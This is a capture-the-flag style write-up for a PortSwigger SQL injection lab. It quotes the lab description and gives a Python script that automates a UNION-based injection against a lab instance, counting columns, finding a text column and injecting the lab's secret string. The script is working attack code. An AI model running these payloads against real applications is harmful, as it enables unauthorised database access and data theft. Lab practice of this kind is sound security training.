# SQL injection UNION attack, finding a column containing text
> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

```python
import requests
import sys

# --- CONFIGURATION ---
# The target URL for the SQL Injection Lab
BASE_URL = "https://0a04006204d7758480de26cf004800d0.web-security-academy.net/"
PATH = "/filter"
TARGET_URL = BASE_URL + PATH

# The secret string the lab asks you to retrieve (Update this per lab instance!)
SECRET_STRING = "'DTBxW6'"

def find_column_count(url):
    """
    Determines the number of columns returned by the database query.
    It iteratively injects ' UNION SELECT NULL... until the error disappears.
    """
    print(f"[*] Starting column count probe on {url}...")
    
    for i in range(1, 50):
        # Create a payload with 'i' NULLs
        nulls = ["NULL"] * i
        null_string = ", ".join(nulls)
        
        # Inject the UNION payload
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        
        # Print progress on the same line to keep terminal clean
        sys.stdout.write(f"\r[~] Testing column count: {i}")
        sys.stdout.flush()
        
        response = requests.get(url, params=payload)
        
        if response.status_code == 200:
            print(f"\n[+] SUCCESS: The query returns {i} columns.")
            return i
            
    return None

def find_text_column(url, num_columns):
    """
    Identifies which column is compatible with string/text data.
    It tests each column index by injecting a dummy string ('abc').
    """
    print(f"[*] Identifying text-compatible column...")
    
    for i in range(num_columns):
        # Prepare a list of NULLs
        nulls = ["NULL"] * num_columns
        
        # Replace the NULL at current index 'i' with a test string
        nulls[i] = "'abc'"
        null_string = ", ".join(nulls)
        
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        
        # Dynamic progress printing
        sys.stdout.write(f"\r[~] Testing column index: {i}")
        sys.stdout.flush()
        
        response = requests.get(url, params=payload)
        
        if response.status_code == 200:
            print(f"\n[+] SUCCESS: Column {i} holds text data.")
            return i
            
    return None

if __name__ == "__main__":
    print(f"--- SQL INJECTION ATTACK STARTED ---\n")

    # Step 1: Find the number of columns
    column_count = find_column_count(TARGET_URL)
    
    if column_count:
        # Step 2: Find which column holds text
        text_index = find_text_column(TARGET_URL, column_count)
        
        if text_index is not None:
            # Step 3: Retrieve the Secret String
            print(f"[*] Injecting secret string: {SECRET_STRING}")
            
            # Construct the final attack payload
            final_nulls = ["NULL"] * column_count
            final_nulls[text_index] = SECRET_STRING
            final_payload_string = ", ".join(final_nulls)
            
            payload = {"category": f"' UNION SELECT {final_payload_string} -- "}
            
            # Send the final request
            response = requests.get(TARGET_URL, params=payload)

            if response.status_code == 200:
                print("\n[+] MISSION ACCOMPLISHED: Secret string retrieved!")
                print("[+] Check the browser to confirm the lab is solved.")
            else:
                print(f"[-] Failed with status code: {response.status_code}")
```